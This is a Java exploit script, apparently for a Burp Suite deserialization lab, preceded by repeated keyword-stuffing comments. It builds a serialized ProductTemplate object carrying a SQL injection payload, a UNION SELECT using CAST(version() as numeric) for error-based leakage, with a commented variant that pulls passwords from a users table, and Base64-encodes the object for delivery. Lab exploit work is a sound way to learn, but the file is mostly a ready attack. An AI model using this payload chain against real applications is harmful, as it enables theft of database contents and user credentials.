
// know how java main lab expert burpsuite
// know how java deserialization script lab expert burpsuite
// know how deserialization script java lab expert burpsuite
// know how deserialization java script lab expert burpsuite
// know how script java deserialization lab expert burpsuite
// know how java serialice sql injection lab expert burpsuite
// know how sql injection deserialization java script lab expert burpsuite
// know how sql injection java deserialization script lab expert burpsuite


import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;

// import custom class
// we import productcatlog for the class we want to serialize and deserialize , its the class that we labs viewed
// we need create a productemplate.java with the class that have the sql injection
import data.productcatalog.ProductTemplate;
import java.io.Serializable;
// we import base64 for encode and decode
import java.util.Base64;

class Main {
    public static void main(String[] args) throws Exception {
    
    // we need put our sql query for sql injection
     // we need put our sql query in the class we want to serialize and deserialize
	//ProductTemplate productTemplate = new ProductTemplate("' UNION SELECT NULL,NULL, NULL, NULL, CAST(password as numeric), NULL, NULL, NULL FROM users --");
	
    ProductTemplate productTemplate = new ProductTemplate("' UNION SELECT NULL, NULL, NULL, NULL, CAST(version() as numeric), NULL, NULL, NULL --");
	
	    String serializedObject = serialize(productTemplate);

        System.out.println("Serialized object: " + serializedObject);

        ProductTemplate deserializedObject = deserialize(serializedObject);

        System.out.println("Deserialized data str: " + deserializedObject.getId( ));//+ deserializedObject.num);
    }

    private static String serialize(Serializable obj) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream(512);
        try (ObjectOutputStream out = new ObjectOutputStream(baos)) {
            out.writeObject(obj);
        }
        return Base64.getEncoder().encodeToString(baos.toByteArray());
    }

    private static <T> T deserialize(String base64SerializedObj) throws Exception {
        try (ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(Base64.getDecoder().decode(base64SerializedObj)))) {
            @SuppressWarnings("unchecked")
            T obj = (T) in.readObject();
            return obj;
        }
    }
}
